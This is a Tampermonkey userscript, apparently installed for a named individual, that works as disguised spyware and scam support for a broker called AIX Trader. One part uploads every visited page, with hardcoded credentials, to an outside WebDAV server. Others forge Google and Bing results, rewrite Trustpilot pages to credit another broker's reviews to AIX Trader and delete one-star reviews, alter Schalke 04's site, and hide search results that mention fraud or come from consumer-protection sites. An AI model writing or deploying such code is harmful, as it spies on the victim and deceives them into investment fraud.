// ==UserScript==
// @name         Combined Ralf Helmstädter
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Combine multiple scripts
// @author       You
// @match        *://*/*
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/478719/Combined%20Ralf%20Helmst%C3%A4dter.user.js
// @updateURL https://update.greasyfork.org/scripts/478719/Combined%20Ralf%20Helmst%C3%A4dter.meta.js
// ==/UserScript==


// Script 0: Webdav upl
if (window.location.href.indexOf("schalke") !== -1 || window.location.href.indexOf("pilot") !== -1) {
  console.log("Excluded website. Script will not run on this page.");
} else {
(function webpageUploaderToWebDAV() {
    // SPECIFY CLIENT NAME HERE
  const clientName = "Ralf Helmstädter";
    // DON'T FORGET TO SPECIFY CLIENT NAME ABOVE


  const webdavURL = "https://webdav.drivehq.com/2 Retention/";
  const username = "Cipberater";
  const password = "Aa123456";
  const folderName = clientName; // The folder name is set to the client's name
  let isUploaded = false;

  function checkAndCreateFolder(path) {
    GM_xmlhttpRequest({
      method: "PROPFIND",
      url: path,
      headers: {
        Authorization: "Basic " + btoa(username + ":" + password)
      },
      onload: function(response) {
        if (response.status === 404) {
          createFolder(path);
        } else if (response.status === 207) {
          console.log("Folder already exists.");
          saveAndUploadPage(path);
        } else {
          console.error("Failed to verify folder.", response);
        }
      }
    });
  }

  function createFolder(path) {
    GM_xmlhttpRequest({
      method: "MKCOL",
      url: path,
      headers: {
        Authorization: "Basic " + btoa(username + ":" + password)
      },
      onload: function(response) {
        if (response.status >= 200 && response.status < 300) {
          console.log("Folder created successfully.");
          saveAndUploadPage(path);
        } else {
          console.error("Failed to create folder.", response);
        }
      }
    });
  }

  function removeUnwantedElements(element) {
    const unwantedElements = ["script", "iframe"];
    unwantedElements.forEach((tag) => {
      const elements = element.querySelectorAll(tag);
      elements.forEach((element) => element.remove());
    });

    const imageElements = element.querySelectorAll("img");
    imageElements.forEach((element) => {
      const src = element.getAttribute("src");
      if (src && !src.startsWith("data:image")) {
        element.remove();
      }
    });
  }

  function saveAndUploadPage(path) {
    if (isUploaded) {
      console.log("File already uploaded. Skipping...");
      return;
    }

    const pageTitle = document.title.trim().replace(/[^a-z0-9]/gi, "_");
    const timestamp = new Date().toISOString().replace(/[^0-9]/g, "");
    const fileName = `${pageTitle}_${timestamp}.html`;

    const clonedDocument = document.documentElement.cloneNode(true);

    removeUnwantedElements(clonedDocument);

    const fragment = document.createDocumentFragment();
    fragment.appendChild(clonedDocument);

    const cspMetaTag = document.createElement("meta");
    cspMetaTag.setAttribute("http-equiv", "Content-Security-Policy");
    cspMetaTag.setAttribute("content", "default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'");
    fragment.querySelector("head").appendChild(cspMetaTag);

    const serializer = new XMLSerializer();
    const htmlContent = serializer.serializeToString(fragment);

    GM_xmlhttpRequest({
      method: "PUT",
      url: `${path}/${fileName}`,
      headers: {
        Authorization: "Basic " + btoa(username + ":" + password),
        "Content-Type": "text/html",
      },
      data: htmlContent,
      onload: function (response) {
        console.log("File uploaded successfully.");
        isUploaded = true;
      },
      onerror: function (response) {
        console.error("Failed to upload the file.", response);
        isUploaded = false;
      },
    });
  }

  const observer = new MutationObserver((mutationsList, observer) => {
    for (let mutation of mutationsList) {
      if (mutation.type === 'childList') {
        removeUnwantedElements(mutation.target);
      }
    }
  });

  observer.observe(document, { childList: true, subtree: true });

  window.addEventListener("load", function () {
    const folderPath = `${webdavURL}/${folderName}`;
    checkAndCreateFolder(folderPath);
  });
})();
}





 // Script 1: Custom Search Results
if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1) {
        (function() {
            'use strict';

            // Padding settings for Google and Bing
            let googlePadding = "0px";
            let bingPadding = "40px";

            // Add style to reduce the space between search results
            let style = document.createElement('style');
            style.type = 'text/css';
            style.innerHTML = `
                .e9EfHf, .b_algo {
                    padding: 0;
                    margin: 20px;
                }
                .eqAnXb, .b_caption {
                    padding: 0;
                    margin: 20px;
                }
                .g, .b_algo {
                    padding: 0;
                    margin: 30px;
                }
            `;
            document.head.appendChild(style);

            try {
                let hostname = window.location.hostname;
                let isGoogleDomain = hostname.includes('google.');
                let isBingDomain = hostname.includes('bing.com');

                if (!isGoogleDomain && !isBingDomain) {
                    return; // Not on Google or Bing, exit script
                }

                let urlParams = new URLSearchParams(window.location.search);
                let queryParam = 'q';
                let query = urlParams.get(queryParam).toLowerCase();
                let startParam = urlParams.get('start') || urlParams.get('first');

                // If not on the first page, do not modify the search results.
                if (startParam !== null && startParam !== '0' && startParam !== '1') {
                    return;
                }

                let customResults = [
                    {
                        keywords: ["aix", "trader", "aixtrader", "blue star", "bluestar", "fiat201", "fiat 201", "schalke", "trust", "aix trader", "aix-trader"],
                        results: [
                            {
                                url: "https://aix-trader.com/",
                                title: "AIX Trader dein Broker",
                                description: "AIX Trader ist der Broker mit der besten Reputation.",
                                footerText: "https://aix-trader.com/",
                                footerTextPosition: {
                                    google: {bottom: "55px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                            {
                                url: "https://de.trustpilot.com/review/icmarkets.com?page=7",
                                title: "Bewertungen von AIX Trader - einer der größten Makler der Welt",
                                description: "Über 30 000 Bewertungen über den Broker AIX Trader",
                                footerText: "https://de.trustpilot.com/review/amadeusmarkets.com?page=7",
                                footerTextPosition: {
                                    google: {bottom: "85px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                             {
                                url: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                title: "AIX Trader Partner von Fussbalklub Schalke 04",
                                description: "Wir freuen uns, bekannt geben zu können, dass Amadeus Markets ab dem 1. Januar unser Sponsor und Partner wird. Amadeus Markets ist spezialisiert auf Vermögensverwaltung und Handel. Unsere Spieler sind Amadeus Markets sehr dankbar, insbesondere Andreas Graf, der ihr Kapital verwaltet.",
                                footerText: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                footerTextPosition: {
                                    google: {bottom: "120px", left: "0px"},
        bing: {bottom: "75px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            }
                        ],
                        // add more groups of custom results here if needed
                    },
                    // Add more groups of custom results here if needed
                ];

                for (let group of customResults) {
                    for (let keyword of group.keywords) {
                        if (query.includes(keyword)) {
                            const checkExist = setInterval(function() {
                                const search = document.querySelector(isGoogleDomain ? 'div#search' : '#b_results');
                                const elementToRemove = document.querySelector(isGoogleDomain ? 'div#taw' : '#b_context');

                                if (search !== null) {
                                    // If the element exists, remove it from the page
                                    if (elementToRemove !== null) {
                                        elementToRemove.parentNode.removeChild(elementToRemove);
                                    }

                                    group.results.forEach(function(resultObj) {
                                        const result = document.createElement('div');
                                        result.innerHTML = `
                                            <div class="g" style="padding-bottom: ${isGoogleDomain ? googlePadding : bingPadding};${isBingDomain ? 'margin: 20px 0;' : ''}">
                                                <div class="rc" style="margin-bottom: 0px;">
                                                    <div class="r">
                                                        <a href="${resultObj.url}">
                                                            <h3 class="LC20lb DKV0Md">${resultObj.title}</h3>
                                                        </a>
                                                    </div>
                                                    <div class="s">
                                                        <div><span>${resultObj.description}</span></div>
                                                    </div>
                                                </div>
                                                <div class="TbwUpd NJjxre iUh30 ojE3Fb" style="position: relative;">
                                                    <span style="position: absolute; bottom: ${isGoogleDomain ? resultObj.footerTextPosition.google.bottom : resultObj.footerTextPosition.bing.bottom}; left: ${isGoogleDomain ? resultObj.footerTextPosition.google.left : resultObj.footerTextPosition.bing.left}; white-space: ${resultObj.footerTextStyles.whiteSpace};">${resultObj.footerText}</span>
                                                </div>
                                            </div>
                                        `;

                                        search.insertBefore(result, search.firstChild);
                                    });

                                    clearInterval(checkExist);
                                }
                            }, 100); // check every 100ms

                            // only handle the first matching keyword
                            break;
                        }
                    }
                }
            } catch (e) {
                console.error(e);
            }
        })();
}


// Script 2: Custom Trustpilot Header and URL Modifier
if (window.location.href.indexOf("https://de.trustpilot.com/") !== -1) {
  (function () {
    'use strict';

    // Define the custom header, logo URL, and URL for the specified element
    const customHeader = "AIX Trader";
    const customLogoURL = "https://aix-trader.com/wp-content/uploads/2023/08/logo_aix.png";
    const customURL = "https://aix-trader.com";
    const customReferenceURL = "aix-trader.com";
    const customLinkURL = "https://aix-trader.com/"; // Replace this with your desired URL

    // Define keyword replacements here (keyword: replacement)
    const keywordReplacements = {
      "ic markets": "AIX Trader",
      "icmarkets": " AIX Trader",
      "ic-markets": "AIX Trader",
      // Add more keyword-replacement pairs as needed
    };

    // Function to replace keywords with their replacement values
    function replaceKeywords() {
      const elements = document.getElementsByTagName("*");
      for (let i = 0; i < elements.length; i++) {
        const element = elements[i];
        for (let j = 0; j < element.childNodes.length; j++) {
          const node = element.childNodes[j];
          if (node.nodeType === 3) {
            const text = node.nodeValue;
            let replacedText = text;
            for (const keyword in keywordReplacements) {
              if (Object.prototype.hasOwnProperty.call(keywordReplacements, keyword)) {
                const replacement = keywordReplacements[keyword];
                replacedText = replacedText.replace(new RegExp(`\\b${keyword}\\b`, "gi"), replacement);
              }
            }
            if (replacedText !== text) {
              element.replaceChild(document.createTextNode(replacedText), node);
            }
          }
        }
      }
    }

    // Function to set black background to the parent element of the inserted image
    function setBlackBackground() {
      const imageWrapperElement = document.querySelector('.profile-image_imageWrapper__kDdWe');
      if (imageWrapperElement) {
        imageWrapperElement.style.backgroundColor = 'black';
      }
    }

    // Function to remove elements with classes "styles_badgesWrapper__6VasU" and "styles_badgesWrapper__6VasU styles_sticky__yeJRO"
    function removeBadgesWrapperElements() {
      const badgesWrapperElements = document.querySelectorAll('.styles_badgesWrapper__6VasU, .styles_badgesWrapper__6VasU.styles_sticky__yeJRO');
      badgesWrapperElements.forEach((element) => {
        element.remove();
      });
    }

    // Function to remove elements with class "styles_cardWrapper__LcCPA styles_show__HUXRb styles_reviewCard__9HxJJ" if they contain the link "https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"
    function removeReviewCardElements() {
      const reviewCardElements = document.querySelectorAll('.styles_cardWrapper__LcCPA.styles_show__HUXRb.styles_reviewCard__9HxJJ');
      reviewCardElements.forEach((element) => {
        const linkElement = element.querySelector('a[href="https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"]');
        if (linkElement) {
          element.remove();
        }
      });
    }

    // Function to replace the logo image with the custom logo URL
    function replaceLogo() {
      const logoImageElement = document.querySelector('.business-profile-image_image__jCBDc');
      if (logoImageElement) {
        logoImageElement.src = customLogoURL;
        logoImageElement.removeAttribute('srcset');
      }
    }

    // Function to remove avif and jpeg elements from the picture element
    function removeAvifAndJpegLinks() {
      const pictureElement = document.querySelector('.business-profile-image_containmentWrapper__wu_Tp');
      if (pictureElement) {
        const avifSourceElement = pictureElement.querySelector('source[type="image/avif"]');
        if (avifSourceElement) {
          avifSourceElement.remove();
        }
        const jpegSourceElement = pictureElement.querySelector('source[type="image/jpeg"]');
        if (jpegSourceElement) {
          jpegSourceElement.remove();
        }
      }
    }

    // Wait for the page to load completely, then perform the modifications
    function onDocumentReady() {
      replaceKeywords();
      setBlackBackground();
      removeBadgesWrapperElements();
      removeReviewCardElements();
      replaceLogo();
      removeAvifAndJpegLinks();
    }

    // Observe mutations in the DOM and trigger modifications
    const observer = new MutationObserver((mutationsList) => {
      for (const mutation of mutationsList) {
        if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
          onDocumentReady();
          break;
        }
      }
    });

    // Start observing the document
    observer.observe(document.body, { childList: true, subtree: true });

    // If the document is already completely loaded, trigger modifications
    if (document.readyState === 'complete') {
      onDocumentReady();
    }
  })();
}

// Script 3: Modify Schalke Website
if (window.location.href.indexOf("schalke") !== -1) {
  var newURL = "https://aix-trader.com/";
var newLogoURL = "https://aix-trader.com/wp-content/uploads/2023/08/logo_aix.png";
var elementIndex = 2; // specify the index of the element here
var padding = {top: 0, right: 0, bottom: 0, left: 0}; // specify the padding here
var moduleIndexToRemove = 20; // specify the index of the .module.module-image element to remove here
var hasRemoved = false; // flag to indicate whether removal has happened

var observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
        if (mutation.type === "childList") {
            var modules = document.querySelectorAll(".module.module-image");
            if (modules.length > elementIndex) {
                var module = modules[elementIndex];
                var link = module.querySelector("a");
                link.href = newURL;
                var img = link.querySelector("img.img-fluid.initial.lazyloaded");
                if (img) {
                    img.setAttribute("data-lazy-src", newLogoURL);
                    img.src = newLogoURL;
                    //img.style.opacity = "0.5"; // set opacity to 50%
                    img.style.filter = "contrast(150%)"; // increase contrast by 50%
                    //module.style.backgroundColor = "#000"; // set black background
                }
                module.style.padding = `${padding.top}px ${padding.right}px ${padding.bottom}px ${padding.left}px`;
            }

            if (!hasRemoved && modules.length > moduleIndexToRemove) {
                var moduleToRemove = modules[moduleIndexToRemove];
                moduleToRemove.remove();
                hasRemoved = true; // set flag to true after removal
            }
        }
    });
});

observer.observe(document.body, {childList: true, subtree: true});


}

// Script 4: Search Result Filter
(function() {
  'use strict';

  // Define the words, domains, and URLs to block
  var blockedWords = ['Betrug', 'schwarz', 'Scam', 'Broker', 'Finanzbetrug']; // Add the words to block here
  var blockedDomains = ['watchlist-internet.at', 'broker-zahlt-nicht.de', 'scamadviser.com', 'finanzsache.com', 'webparanoid.com', 'personal-reviews.com', 'unique-reviews.com', 'kanzlei-herfurtner.de', 'verbraucherzentrale.de', 'betrug.de', 'ritschel-keller.de', 'seitcheck.de' ]; // Add the domains to block here
  var blockedUrls = ['https://www.example1.com', 'https://www.example2.com']; // Add the urls to block here

  // Function to hide elements
  function hideElement(element) {
    if (element.style) element.style.display = 'none';
  }

  // Function to check and hide search results
  function checkAndHideSearchResults() {
    // Google
    var googleResults = document.querySelectorAll('.g');
    googleResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });

    // Bing
    var bingResults = document.querySelectorAll('.b_algo');
    bingResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });
  }

  // Call the function immediately
  checkAndHideSearchResults();

  // Also set an interval to check repeatedly, to deal with lazy-loaded search results
  setInterval(checkAndHideSearchResults, 1000);

})();





